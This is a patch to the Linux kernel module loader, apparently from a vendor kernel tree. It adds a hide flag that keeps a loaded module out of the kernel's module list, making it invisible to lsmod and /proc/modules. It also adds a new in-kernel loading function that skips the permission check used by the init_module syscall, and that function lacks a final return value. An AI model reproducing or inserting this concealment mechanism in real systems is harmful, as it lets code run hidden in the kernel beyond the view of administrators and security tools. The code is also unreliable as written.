@@ -2743,7 +2743,7 @@ static int post_relocation(struct module *mod, const struct load_info *info)
    zero, and we rely on this for optional sections. */
 static struct module *load_module(void __user *umod,
 				  unsigned long len,
-				  const char __user *uargs)
+				  const char __user *uargs,int flags)
 {
 	struct load_info info = { NULL, };
 	struct module *mod;
@@ -2828,7 +2828,8 @@ static struct module *load_module(void __user *umod,
 		goto ddebug;
 
 	module_bug_finalize(info.hdr, info.sechdrs, mod);
-	list_add_rcu(&mod->list, &modules);
+	if(0==(flags&KERNEL_MODULE_FLAG_HIDE))
+		list_add_rcu(&mod->list, &modules);
 	mutex_unlock(&module_mutex);
 
 #ifdef CONFIG_RK_CONFIG
@@ -2882,6 +2883,8 @@ static struct module *load_module(void __user *umod,
 	return ERR_PTR(err);
 }
 
+
+
 /* Call module constructors. */
 static void do_mod_ctors(struct module *mod)
 {
@@ -2905,7 +2908,7 @@ SYSCALL_DEFINE3(init_module, void __user *, umod,
 		return -EPERM;
 
 	/* Do all the hard work */
-	mod = load_module(umod, len, uargs);
+	mod = load_module(umod, len, uargs,0);
 	if (IS_ERR(mod))
 		return PTR_ERR(mod);
 
@@ -2976,6 +2979,84 @@ SYSCALL_DEFINE3(init_module, void __user *, umod,
 	mutex_unlock(&module_mutex);
 
 	return 0;
+}
+
+
+int kernel_init_module(void * umod,unsigned long len, const char * uargs,int flags)
+{
+	struct module *mod;
+	int ret = 0;
+
+	/* Do all the hard work */
+	mod = load_module(umod, len, uargs,flags);
+	if (IS_ERR(mod))
+		return PTR_ERR(mod);
+
+	blocking_notifier_call_chain(&module_notify_list,
+			MODULE_STATE_COMING, mod);
+
+	/* Set RO and NX regions for core */
+	set_section_ro_nx(mod->module_core,
+				mod->core_text_size,
+				mod->core_ro_size,
+				mod->core_size);
+
+	/* Set RO and NX regions for init */
+	set_section_ro_nx(mod->module_init,
+				mod->init_text_size,
+				mod->init_ro_size,
+				mod->init_size);
+
+	do_mod_ctors(mod);
+	/* Start the module */
+	if (mod->init != NULL)
+		ret = do_one_initcall(mod->init);
+	if (ret < 0) {
+		/* Init routine failed: abort.  Try to protect us from
+                   buggy refcounters. */
+		mod->state = MODULE_STATE_GOING;
+		synchronize_sched();
+		module_put(mod);
+		blocking_notifier_call_chain(&module_notify_list,
+					     MODULE_STATE_GOING, mod);
+		free_module(mod);
+		wake_up(&module_wq);
+		return ret;
+	}
+	if (ret > 0) {
+		printk(KERN_WARNING
+"%s: '%s'->init suspiciously returned %d, it should follow 0/-E convention\n"
+"%s: loading module anyway...\n",
+		       __func__, mod->name, ret,
+		       __func__);
+		dump_stack();
+	}
+
+	/* Now it's a first class citizen!  Wake up anyone waiting for it. */
+	mod->state = MODULE_STATE_LIVE;
+	wake_up(&module_wq);
+	blocking_notifier_call_chain(&module_notify_list,
+				     MODULE_STATE_LIVE, mod);
+
+	/* We need to finish all async code before the module init sequence is done */
+	async_synchronize_full();
+
+	mutex_lock(&module_mutex);
+	/* Drop initial reference. */
+	module_put(mod);
+	trim_init_extable(mod);
+#ifdef CONFIG_KALLSYMS
+	mod->num_symtab = mod->core_num_syms;
+	mod->symtab = mod->core_symtab;
+	mod->strtab = mod->core_strtab;
+#endif
+	unset_module_init_ro_nx(mod);
+	module_free(mod, mod->module_init);
+	mod->module_init = NULL;
+	mod->init_size = 0;
+	mod->init_ro_size = 0;
+	mod->init_text_size = 0;
+	mutex_unlock(&module_mutex);
 }
 
 static inline int within(unsigned long addr, void *start, unsigned long size)
